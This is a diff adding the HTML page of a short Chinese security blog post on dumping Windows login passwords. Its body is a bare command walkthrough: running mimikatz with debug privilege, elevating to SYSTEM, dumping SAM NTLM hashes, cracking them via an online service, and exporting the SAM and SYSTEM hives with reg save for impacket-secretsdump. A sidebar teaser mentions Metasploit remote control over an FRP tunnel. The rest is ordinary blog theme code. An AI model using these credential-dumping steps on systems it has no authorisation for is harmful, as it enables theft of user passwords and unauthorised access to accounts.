@@ -1,0 +1,186 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Windows登陆密码获取 | -&gt;&lt;Welcome Aboard_Cyanide17's domain&gt;&lt;-</title><meta name="author" content="Cyanide17"><meta name="copyright" content="Cyanide17"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#CFD4DB"><meta name="description" content="Mimikatz开启mimikatz。以管理员权限打开cmd，进入目录下1mimikatz.exe  验证1privilege::debug  （如果出现以下报错：ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061 说明你不是管理员权限） 提权至 NT AUTHORITY\SYSTEM1token::elevate  获">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Windows登陆密码获取">
+<meta property="og:url" content="http://cyanide17.github.io/2026/04/28/GetWindowskey/index.html">
+<meta property="og:site_name" content="-&gt;&lt;Welcome Aboard_Cyanide17&#39;s domain&gt;&lt;-">
+<meta property="og:description" content="Mimikatz开启mimikatz。以管理员权限打开cmd，进入目录下1mimikatz.exe  验证1privilege::debug  （如果出现以下报错：ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061 说明你不是管理员权限） 提权至 NT AUTHORITY\SYSTEM1token::elevate  获">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://cyanide17.github.io/img/avater.png">
+<meta property="article:published_time" content="2026-04-27T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-04-28T09:00:49.605Z">
+<meta property="article:author" content="Cyanide17">
+<meta property="article:tag" content="NTLM hashcat">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://cyanide17.github.io/img/avater.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Windows登陆密码获取",
+  "url": "http://cyanide17.github.io/2026/04/28/GetWindowskey/",
+  "image": "http://cyanide17.github.io/img/avater.png",
+  "datePublished": "2026-04-27T16:00:00.000Z",
+  "dateModified": "2026-04-28T09:00:49.605Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Cyanide17",
+      "url": "http://Cyanide17.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/logo.png"><link rel="canonical" href="http://cyanide17.github.io/2026/04/28/GetWindowskey/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.4"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.9/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#CFD4DB')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":230,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: true,
+    post: true
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: true,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Windows登陆密码获取',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 8.1.1"></head><body><script>window.paceOptions = {
+  restartOnPushState: false
+}
+
+btf.addGlobalFn('pjaxSend', () => {
+  Pace.restart()
+}, 'pace_restart')
+
+</script><link rel="stylesheet" href="/css/loading-bar.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><div class="bg-animation" id="web_bg" style="background-image: url(/img/background.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/avater.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">3</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主舱</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 航行日志</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tag"></i><span> 标识</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 模块</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 驻足</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 节奏</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fas fa-link"></i><span> 比邻</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 舰志</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/bkg.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"></a><a class="nav-page-title" href="/"><span class="site-name">Windows登陆密码获取</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 探测</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主舱</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 航行日志</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tag"></i><span> 标识</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 模块</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 驻足</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 节奏</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fas fa-link"></i><span> 比邻</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 舰志</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Windows登陆密码获取</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-04-27T16:00:00.000Z" title="发表于 2026-04-28 00:00:00">2026-04-28</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-04-28T09:00:49.605Z" title="更新于 2026-04-28 17:00:49">2026-04-28</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/MISC/">MISC</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">109</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>1分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h2><h3 id="开启mimikatz。以管理员权限打开cmd，进入目录下"><a href="#开启mimikatz。以管理员权限打开cmd，进入目录下" class="headerlink" title="开启mimikatz。以管理员权限打开cmd，进入目录下"></a>开启mimikatz。以管理员权限打开cmd，进入目录下</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe</span><br></pre></td></tr></table></figure>
+
+<h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br></pre></td></tr></table></figure>
+
+<p>（如果出现以下报错：ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061 说明你不是管理员权限）</p>
+<h3 id="提权至-NT-AUTHORITY-SYSTEM"><a href="#提权至-NT-AUTHORITY-SYSTEM" class="headerlink" title="提权至 NT AUTHORITY\SYSTEM"></a>提权至 NT AUTHORITY\SYSTEM</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">token::elevate</span><br></pre></td></tr></table></figure>
+
+<h3 id="获取到NTLM的hash"><a href="#获取到NTLM的hash" class="headerlink" title="获取到NTLM的hash"></a>获取到NTLM的hash</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::sam</span><br></pre></td></tr></table></figure>
+
+<h3 id="NTLM解密"><a href="#NTLM解密" class="headerlink" title="NTLM解密"></a>NTLM解密</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.cmd5.com</span><br></pre></td></tr></table></figure>
+
+<h2 id="hashcat"><a href="#hashcat" class="headerlink" title="hashcat"></a>hashcat</h2><h3 id="获取加密哈希值"><a href="#获取加密哈希值" class="headerlink" title="获取加密哈希值"></a>获取加密哈希值</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\sam Q:\sam.hive</span><br></pre></td></tr></table></figure>
+
+<h3 id="获取密钥文件"><a href="#获取密钥文件" class="headerlink" title="获取密钥文件"></a>获取密钥文件</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\system Q:\system.hive</span><br></pre></td></tr></table></figure>
+
+<h3 id="分析sam文件，提取NTLM-Hash"><a href="#分析sam文件，提取NTLM-Hash" class="headerlink" title="分析sam文件，提取NTLM Hash"></a>分析sam文件，提取NTLM Hash</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-secretsdump -sam sam.hive -system system.hive LOCAL</span><br></pre></td></tr></table></figure>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://Cyanide17.github.io">Cyanide17</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://cyanide17.github.io/2026/04/28/GetWindowskey/">http://cyanide17.github.io/2026/04/28/GetWindowskey/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://Cyanide17.github.io" target="_blank">-><Welcome Aboard_Cyanide17's domain><-</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/NTLM-hashcat/">NTLM hashcat</a></div><div class="post-share"><div class="social-share" data-image="/img/avater.png" data-sites="wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/04/28/FRP_case/" title="FRP内网穿透_实例"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">FRP内网穿透_实例</div></div><div class="info-2"><div class="info-item-1">+Metasploit 实现kali端→服务器→目标机远控   公网服务器设置安全策略开放自定义tcp入站9999和7000端口建立FRP隧道并配置端口转发在公网VPS上部署FRP服务端（FRPS）FRP服务端运行在你的公网VPS上，它的作用是作为一个流量中转站，等待内网Kali的连接，并将公网上的流量转发给Kali。 下载FRP：SSH登录到VPS，下载FRP压缩包并解压12wget https://github.com/fatedier/frp/releases/download/v0.58.0/frp_0.58.0_linux_amd64.tar.gztar -zxvf frp_0.58.0_linux_amd64.tar.gz  1cd frp_0.58.0_linux_amd64  配置FRP服务端：编辑服务端配置文件 frps.toml1vim frps.toml  添加以下内容（FRP服务端将在VPS的7000端口上监听，等待内网Kali的连接） 1234bindPort = 7000auth.method = &quot;token&quot;auth.token...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/avater.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Cyanide17</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">3</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Cyanide17"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Cyanide17" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:Eraexpedition@163.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">站点初建，还在测试中...欢迎来访😁</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Mimikatz"><span class="toc-number">1.</span> <span class="toc-text">Mimikatz</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%80%E5%90%AFmimikatz%E3%80%82%E4%BB%A5%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90%E6%89%93%E5%BC%80cmd%EF%BC%8C%E8%BF%9B%E5%85%A5%E7%9B%AE%E5%BD%95%E4%B8%8B"><span class="toc-number">1.1.</span> <span class="toc-text">开启mimikatz。以管理员权限打开cmd，进入目录下</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81"><span class="toc-number">1.2.</span> <span class="toc-text">验证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E8%87%B3-NT-AUTHORITY-SYSTEM"><span class="toc-number">1.3.</span> <span class="toc-text">提权至 NT AUTHORITY\SYSTEM</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%88%B0NTLM%E7%9A%84hash"><span class="toc-number">1.4.</span> <span class="toc-text">获取到NTLM的hash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NTLM%E8%A7%A3%E5%AF%86"><span class="toc-number">1.5.</span> <span class="toc-text">NTLM解密</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hashcat"><span class="toc-number">2.</span> <span class="toc-text">hashcat</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%8A%A0%E5%AF%86%E5%93%88%E5%B8%8C%E5%80%BC"><span class="toc-number">2.1.</span> <span class="toc-text">获取加密哈希值</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%AF%86%E9%92%A5%E6%96%87%E4%BB%B6"><span class="toc-number">2.2.</span> <span class="toc-text">获取密钥文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90sam%E6%96%87%E4%BB%B6%EF%BC%8C%E6%8F%90%E5%8F%96NTLM-Hash"><span class="toc-number">2.3.</span> <span class="toc-text">分析sam文件，提取NTLM Hash</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/04/28/FRP_case/" title="FRP内网穿透_实例">FRP内网穿透_实例</a><time datetime="2026-04-27T16:00:00.000Z" title="发表于 2026-04-28 00:00:00">2026-04-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/04/28/GetWindowskey/" title="Windows登陆密码获取">Windows登陆密码获取</a><time datetime="2026-04-27T16:00:00.000Z" title="发表于 2026-04-28 00:00:00">2026-04-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/04/27/hello-world/" title="初来乍到 ^_^">初来乍到 ^_^</a><time datetime="2026-04-27T10:42:43.671Z" title="发表于 2026-04-27 18:42:43">2026-04-27</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/footer.png);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By Cyanide17</span></div></div><div id="my-footer-beautify"></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.4"></script><script src="/js/main.js?v=5.5.4"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.9/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@5.2.0/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@19.1.3/dist/lazyload.iife.min.js"></script><div class="js-pjax"></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="30" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/canvas-nest.min.js"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/metingjs/dist/Meting.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">探测</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="检索数据" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.4"></script></div></div></body></html>
